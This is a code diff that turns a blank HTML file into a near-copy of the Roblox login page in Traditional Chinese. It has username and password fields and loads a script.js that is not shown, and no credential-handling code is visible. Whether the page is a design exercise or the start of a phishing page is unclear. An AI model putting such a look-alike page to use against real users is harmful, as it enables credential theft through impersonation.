@@ -1,10 +1,77 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh-Hant">
 <head>
-    <meta charset="UTF-8">
-    <title>Title</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Roblox</title>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
 
+<div id="react-login-web-app" class="login-container">
+    <div id="login-base" class="login-base-container">
+        <div class="section-content login-section">
+            <h1 class="login-header">登入 Roblox</h1>
+            <div id="login-form">
+                <div class="login-form-container">
+                    <form class="login-form" name="loginForm">
+                        <div class="form-group username-form-group">
+                            <label for="login-username" class="sr-only">使用者名稱／電子郵件地址／手機號碼</label>
+                            <input id="login-username" name="username" type="text" class="form-control input-field" autocomplete="username webauthn" placeholder="使用者名稱／電子郵件地址／手機號碼">
+                        </div>
+                        <div class="form-group password-form-group">
+                            <label for="login-password" class="sr-only">密碼</label>
+                            <input id="login-password" name="password" type="password" class="form-control input-field" placeholder="密碼">
+                            <div aria-live="polite"></div>
+                        </div>
+                        <button type="button" id="login-button" class="btn-full-width login-button btn-secondary-md">登入</button>
+                    </form>
+                </div>
+            </div>
+
+            <div class="text-center forgot-credentials-link">
+                <a id="forgot-credentials-link" class="text-link" href="#">忘記密碼或使用者名稱？</a>
+            </div>
+
+            <div>
+                <div class="alternative-login-divider-container">
+                    <div class="rbx-divider alternative-login-divider"></div>
+                </div>
+                <button type="button" id="otp-login-button" class="btn-full-width btn-control-md otp-login-button">
+                    透過電子郵件給我一次性驗證碼
+                </button>
+                <button type="button" id="cross-device-login-button" class="btn-full-width btn-control-md cross-device-login-button">
+                    <span>使用其他裝置</span>
+                </button>
+            </div>
+
+            <div class="text-center">
+                <div class="signup-option">
+                    <span class="no-account-text">沒有帳號？</span>
+                    <a id="sign-up-link" class="text-link signup-link" href="#">註冊</a>
+                </div>
+            </div>
+
+        </div>
+    </div>
+</div>
+
+<div id="header" class="navbar-fixed-top rbx-header" role="navigation">
+        <div class="rbx-navbar-header">
+            <div class="navbar-header">
+                <a class="navbar-brand" href="/home">
+                    <span class="icon-logo"></span>
+                </a>
+            </div>
+            <a class="font-header-2 nav-menu-title text-header charts-rename-exp-treatment" href="/charts">圖表</a>
+            <a class="font-header-2 nav-menu-title text-header" href="/catalog">市集</a>
+            <a id="header-develop-md-link" class="font-header-2 nav-menu-title text-header" href="https://create.roblox.com/">創作</a>
+            <a class="font-header-2 nav-menu-title text-header robux-menu-btn" href="https://www.roblox.com/upgrades/robux?ctx=navpopover">Robux</a>
+            <input id="navbar-search-input" type="search" name="search-bar" class="form-control input-field new-input-field" placeholder="搜尋">
+            <a class="rbx-navbar-signup btn-growth-sm nav-menu-title signup-button" href="https://www.roblox.com/CreateAccount" id="sign-up-button">註冊</a>
+        </div>
+</div>
+
+<script src="script.js"></script>
 </body>
 </html>
